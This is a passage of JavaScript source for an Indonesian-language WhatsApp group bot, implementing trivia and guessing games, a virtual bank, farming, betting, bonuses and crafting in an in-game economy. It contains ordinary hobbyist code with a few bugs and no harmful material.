replygcxeon(`*GAME TEBAK LIRIK*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete XeonBotInc.tebaklirik[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'caklontong': {
  if (!m.isGroup) return reply(mess.only.group)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 XeonBotInc.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'family100': {
  if (!m.isGroup) return reply(mess.only.group)
  let winScore = 10000
 let id = m.chat
	if (id in XeonBotInc.family100) return replygcxeon('Masih Ada Sesi Yang Belum Diselesaikan!')
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n\nSoal : ${json.soal}\n\nHadiah : 10.000 money\n\nTerdapat *${json.jawaban.length}* Jawaban ${json.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 XeonBotInc.family100[id] = {
			id,
			msg: await replygcxeon(`${hasil}`),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }
}
break
//==================================================================
case 'upvn':{
if (!XeonTheCreator) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
XeonBotInc.sendMessage('status@broadcast', {audio: { url: media }, mimetype: 'audio/mp3', ptt:true },{
backgroundColor: getRandomHexColor(),
statusJidList: Object.keys(db.users)
});
}
reply(`*Sukses mengirim status whatsapp ke  Orang Yang Ada Di database*`)
break
//==================================================================
case 'tebaktebakan': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
    tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    XeonBotInc.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
    delete tebaktebakan[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'tebakbendera': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    XeonBotInc.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakbenderav2': {
  if (!m.isGroup) return reply(mess.only.group)
 if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    XeonBotInc.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkabupaten': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
    tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.title)
    XeonBotInc.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
    delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkimia': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
    tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
})
await sleep(60000)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.lambang)
    XeonBotInc.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
    delete tebakkimia[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'asahotak': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
    tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    XeonBotInc.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
    delete tebakasahotak[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'siapaaku':{
  if (!m.isGroup) return reply(mess.only.group)
  let users = global.db.users[m.sender]
	let timeout = 80000 
	let poin = 10000
	let id = m.chat 
	if (id in XeonBotInc.siapaaku) return replygcxeon('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	 
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	XeonBotInc.siapaaku[id] = [
	await replygcxeon(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (XeonBotInc.siapaaku[id]) 
users.money -= 200
replygcxeon(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete XeonBotInc.siapaaku[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'susunkata':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 80000
	let poin = 10000
	let id = m.chat
	if (id in XeonBotInc.susunkata) return replygcxeon('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
Tipe: ${json.tipe}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	XeonBotInc.susunkata[id] = [
	await replygcxeon(`${caption}`),
	json, poin,
	setTimeout(() => {
replygcxeon(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete XeonBotInc.susunkata[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tekateki':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 80000
	let users = global.db.users[m.sender]
	let poin = 10000
	let id = m.chat
	if (id in XeonBotInc.tekateki) return replygcxeon('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Hadiah: ${poin} Money 💸
	`.trim()
	XeonBotInc.tekateki[id] = [
	await replygcxeon(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (XeonBotInc.tekateki[id]) 
users.money -= 200
replygcxeon(`*GAME TEKA-TEKI*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.users[sender].money.toLocaleString()}*`)
	delete XeonBotInc.tekateki[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tebakbendera2': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    XeonBotInc.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
    delete tebakbendera2[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'banknabung': {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replygcxeon('kamu belum mempunyai kartu ATM')
  if (user.bank > user.fullatm) return replygcxeon('Uang Di ATM sudah penuh!')
  if (count > user.fullatm - user.bank) return m.reply('Uangnya nya sudah mencapai batas')
  if (user.money >= xpperlimit * count) {
    user.money -= xpperlimit * count
    user.bank += count
    replygcxeon(`Sukses menabung sebesar ${count} Money 💹`)
  } else replygcxeon(`[❗] Uang anda tidak mencukupi untuk menabung ${count} money 💹`, )
}
break
//==================================================================
case 'banktarik': {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.bank / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replygcxeon('kamu belum mempuyai kartu ATM !')
  if (user.bank >= xpperlimit * count) {
    user.bank -= xpperlimit * count
    user.money += count
    replygcxeon(`Sukses menarik sebesar ${count} Money 💹`)
  } else replygcxeon(`[❗] Uang dibank anda tidak mencukupi untuk ditarik sebesar ${count} money 💹`)
}
break
//==================================================================
case 'berkebon':{
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
const timeout = 1800000
    let __timers = (new Date - global.db.users[m.sender].lastberkebon)
    let _timers = (timeout - __timers)
    let timers = clockString(_timers)
    let user = global.db.users[m.sender]
    let { stock } = global.db.settings[botNumber]
    let pisang = 100 - user.bibitpisang
    let anggur = 100 - user.bibitanggur
    let mangga = 100 - user.bibitmangga
    let jeruk = 100 - user.bibitjeruk
    let apel = 100 - user.bibitapel
    let kerja = 'Berkebun'
    let id = m.chat
    .misi = XeonBotInc.misi ? XeonBotInc.misi : {}
    if (id in XeonBotInc.misi) {
        replygcxeon(`Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        return false
    }
    let caption = `
📮 Kamu Membutuhkan Bibit:\n${user.bibitpisang < 100 ? `\n${global.rpg.emoticon('bibitpisang')} BibitPisang: ${pisang}`: ''} ${user.bibitanggur < 100 ? `\n${global.rpg.emoticon('bibitanggur')} BibitAnggur: ${anggur}`: ''} ${user.bibitmangga < 100 ? `\n${global.rpg.emoticon('bibitmangga')} BibitMangga: ${mangga}`: ''} ${user.bibitjeruk < 100 ? `\n${global.rpg.emoticon('bibitjeruk')} BibitJeruk: ${jeruk}`: ''} ${user.bibitapel < 100 ? `\n${global.rpg.emoticon('bibitapel')} BibitApel: ${apel}`: ''}`.trim()
    if (new Date - user.lastberkebon > 1800000) {
        if (user.bibitpisang >= 100 && user.bibitanggur >= 100 && user.bibitmangga >= 100 && user.bibitapel >= 100 && user.bibitjeruk >= 100) {
            let hasil1 = Math.floor(Math.random() * 100)
            let hasil2 = Math.floor(Math.random() * 100)
            let hasil3 = Math.floor(Math.random() * 100)
            let hasil4 = Math.floor(Math.random() * 100)
            let hasil5 = Math.floor(Math.random() * 100)

            let caption = `⌛ Hasil Panen Kamu

${global.rpg.emoticon('pisang')} Pisang: ${hasil1}
${global.rpg.emoticon('anggur')} Anggur ${hasil2}
${global.rpg.emoticon('mangga')} Mangga: ${hasil3}
${global.rpg.emoticon('jeruk')} Jeruk: ${hasil4}
${global.rpg.emoticon('apel')} Apel: ${hasil5}
`
            user.pisang += hasil1
            user.anggur += hasil2
            user.mangga += hasil3
            user.jeruk += hasil4
            user.apel += hasil5

            user.bibitpisang -= 100
            user.bibitanggur -= 100
            user.bibitmangga -= 100
            user.bibitjeruk -= 100
            user.bibitapel -= 100

            stock.bibitpisang += 100
            stock.bibitanggur += 100
            stock.bibitmangga += 100
            stock.bibitjeruk += 100
            stock.bibitapel += 100


            XeonBotInc.misi[id] = [
kerja,
setTimeout(() => {
delete XeonBotInc.misi[id]
}, 20000)
            ]

            setTimeout(() => {
replygcxeon(`${caption.trim()}`)
            }, 20000)

            setTimeout(() => {
replygcxeon('Sedang Menanam Bibit...')
            }, 0)
            user.lastberkebon = new Date * 1
        } else replygcxeon(`${caption}`)
    } else replygcxeon(`Mohon Menunggu Selama ${timers} Untuk Berkebun Kembali...`)
}
break
//==================================================================
case 'bet': {
  if (!m.isGroup) return reply(mess.only.group)
  function number(x = 0) {
    x = parseInt(x)
    return !isNaN(x) && typeof x == 'number'
}
const items = [ 'money', 'chip' ]
    let user = global.db.users[m.sender]
    let item = items.filter(v => v in user && typeof user[v] == 'number')
    let type = (args[0] || '').toLowerCase()
    let count = (args[1] && number(parseInt(args[1])) ? Math.max(parseInt(args[1]), 1): /all/i.test(args[1]) ? Math.floor(parseInt(user[type])): 1) * 1
    if (!item.includes(type)) return replygcxeon(`*List Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nExample:\nbet money 100000`)
    if ((user[type] * 1) < count) return replygcxeon(`*${type} ${global.rpg.emoticon(type)}* kamu tidak cukup!!`)
    let moneyDulu = user[type] * 1
    let txt = (m.msg && m.msg.selectedDisplayText ? m.msg.selectedDisplayText: m.text ? m.text: '').toLowerCase()
    try {
        let Bot = (Math.ceil(Math.random() * 91)) * 1
        let Kamu = (Math.floor(Math.random() * 71)) * 1
        let status = 'Kalah'
        if (Bot < Kamu) {
            user[type] += count * 1
            status = 'Menang'
        } else if (Bot > Kamu) {
            user[type] -= count * 1
        } else {
            status = 'Seri'
            user[type] += (Math.floor(count / 1.5)) * 1
        }
        replygcxeon(`
| *PLAYERS* | *POINT* |
*🤖 BOT:*      ${Bot}
*👤 KAMU:*    ${Kamu}

Kamu *${status}*, kamu ${status == 'Menang' ? `Mendapatkan *+${count * 2}*`: status == 'Kalah' ? `Kehilangan *-${count * 1}*`: `Mendapatkan *+${Math.floor(count / 1.5)}*`} *${type} ${global.rpg.emoticon(type)}*
`.trim())
    } catch (e) {
        if (moneyDulu > (user[type] * 1)) user[type] = moneyDulu * 1
        replygcxeon('Error saat melakukan judi (Rejected)')
    }
}
break
//==================================================================
case 'claim':
case 'bonus': {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " jam " + minutes + " menit " + seconds + " detik"
}
    let user = global.db.users[m.sender]
    let time = user.lastbonus + 86400000
    if (new Date - user.lastbonus < 86400000) return replygcxeon(`Kamu Sudah Ambil Bonus Hari Ini\nTunggu selama ${msToTime(time - new Date())} lagi`)
    let money = Math.floor(Math.random() * 50000000)
    user.money += money * 1
    user.lastbonus = new Date * 1
    replygcxeon(`Selamat Kamu Mendapatkan Bonus : \n+${money} Money`)
}
break
//==================================================================
case 'buah': {
  if (!m.isGroup) return reply(mess.only.group)
	let user = global.db.users[m.sender]
	let ini_txt = `[ *GUDANG BUAH KAMU* ]\n\n`
	ini_txt += `🍌 ${user.pisang} Pisang\n`
	ini_txt += `🍇 ${user.anggur} Anggur\n`
	ini_txt += `🥭 ${user.mangga} Mangga\n`
	ini_txt += `🍊 ${user.jeruk} Jeruk\n`
	ini_txt += `🍎 ${user.apel} Apel\n\n`
	ini_txt += `Gunakan command *buah sell* untuk menjual.`
	replygcxeon(`${ini_txt}`)
}
break
//==================================================================
case 'bunuh':
case 'hitman': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
        let h = Math.floor(ms / 3600000)
        let m = Math.floor(ms / 60000) % 60
        let s = Math.floor(ms / 1000) % 60
        return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = XeonBotInc.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
	let kerja = 'Bunuh'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi : {}
    if (id in XeonBotInc.misi) {
        replygcxeon(`Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🕵️ Mendapatkan Target.....
`.trim()

        var dimas2 = `
⚔️ Menusuk Tubuhnya.....
`.trim()

        var dimas3 = `
☠️ Target meninggal\nDan kamu mengambil barang² nya
`.trim()

        var dimas4 = `
💼 Hasil dari membunuh....
`.trim()

        var hsl = `
*—[ Hasil ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 👮 Pelanggaran +1
➕ ☑️ Misi Berhasil = +1
➕  📥Total Misi Sebelumnya : ${order}
`.trim()

		user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1
        user.warn += 1

		XeonBotInc.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete XeonBotInc.misi[id]
        }, 27000)
    	]
        setTimeout(() => {
            replygcxeon(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replygcxeon(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replygcxeon(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replygcxeon(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replygcxeon(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replygcxeon('🔍Mencari Target pembunuhan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replygcxeon(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//==================================================================
case 'collect': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastclaim)
    let _timers = (43200000 - __timers)
    let timers = clockString(_timers) 
    let user = global.db.users[m.sender]
    if (new Date - global.db.users[m.sender].lastclaim > 43200000) {
        replygcxeon(`Kamu sudah mengclaim dan mendapatkan *1000* 💵money dan *1* 🥤potion`)
        user.money += 1000
        user.potion += 1
        user.lastclaim = new Date * 1
    } else replygcxeon(`silahkan tunggu *${timers}* lagi untuk bisa mengclaim lagi`)
}
break

//==================================================================
case 'craft':
case 'crafting': {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  let { stock } = global.db.settings[botNumber]

  let caption = `
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} pickaxe*

*乂 List Yang Bisa Di Craft*
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼
▧ Atm 💳

*乂 Recipe*
▧ Pickaxe ⛏️
〉 10 Kayu
〉 5 Batu
〉 5 Iron
〉 20 String

▧ Sword ⚔️
〉 10 Kayu
〉 15 Iron

▧ Fishingrod 🎣
〉 10 Kayu
〉 2 Iron
〉 20 String

▧ Armor 🥼
〉 30 Iron
〉 1 Emerald
〉 5 Diamond

▧ Atm 💳
〉3 Emerald
〉6 Diamond
〉10k Money
`
  try {
    if (/craft|Crafting/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxe > 0) return replygcxeon('Kamu sudah memilik ini')
            if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return replygcxeon(`Barang tidak cukup!\nUntuk membuat pickaxe. Kamu memerlukan : ${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Batu 🪨` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 5
            stock.iron += 5
        
            user.rock -= 5
            stock.rock += 5

            user.string -= 20
            stock.string += 20

            user.pickaxe += 1
            user.pickaxedurability = 40
            replygcxeon("Sukses membuat 1 pickaxe 🔨")
            break
          case 'sword':
          if (user.sword > 0) return replygcxeon('Kamu sudah memilik ini')
            if(user.wood < 10 || user.iron < 15) return replygcxeon(`Barang tidak cukup!\nUntuk membuat sword. Kamu memerlukan :${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 15
            stock.iron += 15

            user.sword += 1
            user.sworddurability = 40
            replygcxeon("Sukses membuat 1 sword 🗡️")
            break
          case 'fishingrod':
          if (user.fishingrod > 0) return replygcxeon('Kamu sudah memilik ini')
            if(user.wood < 20 || user.iron < 5 || user.string < 20) return replygcxeon(`Barang tidak cukup!\nUntuk membuat pancingan. Kamu memerlukan :${user.wood < 20 ? `\n${20 - user.wood} kayu🪵` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 2
            stock.iron +=2

            user.string -= 20
            stock.string += 20

            user.fishingrod += 1
            user.fishingroddurability = 40
            replygcxeon("Sukses membuat 1 Pancingan 🎣")
            break
          case 'armor':
          if (user.armor > 0) return replygcxeon('Kamu sudah memilik ini')
            if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return replygcxeon(`Barang tidak cukup!\nUntuk membuat armor. Kamu memerlukan :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 1
            stock.emerald += 1

            user.iron -= 30
            stock.iron += 30

            user.diamond -= 5
            stock.diamond += 5

            user.armor += 1
            user.armordurability = 50
            replygcxeon("Sukses membuat 1 Armor 🥼")
            break
            case 'atm':
          if (user.atm > 0) return replygcxeon('Kamu sudah memilik ini')
            if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return replygcxeon(`Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${user.money < 10000 ? `\n${10000 - user.money} Money 💹` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 3
            stock.emerald += 3

            user.diamond -= 6
            stock.diamond += 6

            user.money -= 10000
            user.atm += 1
            user.fullatm = 500000000
            replygcxeon("Sukses membuat 1 Atm 💳")
            break
          default:
            return await replygcxeon(`${caption}`)
        }
    } 
  } catch (err) {
    replygcxeon("Error\n\n\n" + err.stack)
  }
}
break
//==================================================================
case 'feed': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = isNaN(ms) ? '--' : Math.floor(ms / 310000)
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [h, ' H ', m, ' M ', s, ' S'].map(v => v.toString().padStart(2, 0)).join('')
}
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}

	let info = `
乂 List Pet:
🐈 • Cᴀᴛ
🐕 • Dᴏɢ
🐎 • Hᴏʀsᴇ
🦊 • Fᴏx
🤖 • Rᴏʙᴏ

*➠ Example:* ${command}fcat
`.trim()
let pesan = pickRandom(['ɴʏᴜᴍᴍᴍ~', 'ᴛʜᴀɴᴋs', 'ᴛʜᴀɴᴋʏᴏᴜ ^-^', '...', 'ᴛʜᴀɴᴋ ʏᴏᴜ~', 'ᴀʀɪɢᴀᴛᴏᴜ ^-^'])
    let type = (args[0] || '').toLowerCase()
    let emo = (type == 'fox' ? '🦊':'' || type == 'cat' ? '🐈':'' || type == 'dog' ? '🐕':'' || type == 'horse' ? '🐴':'' || type == 'robo'? '🤖':'' ) 
    let user = global.db.users[m.sender]
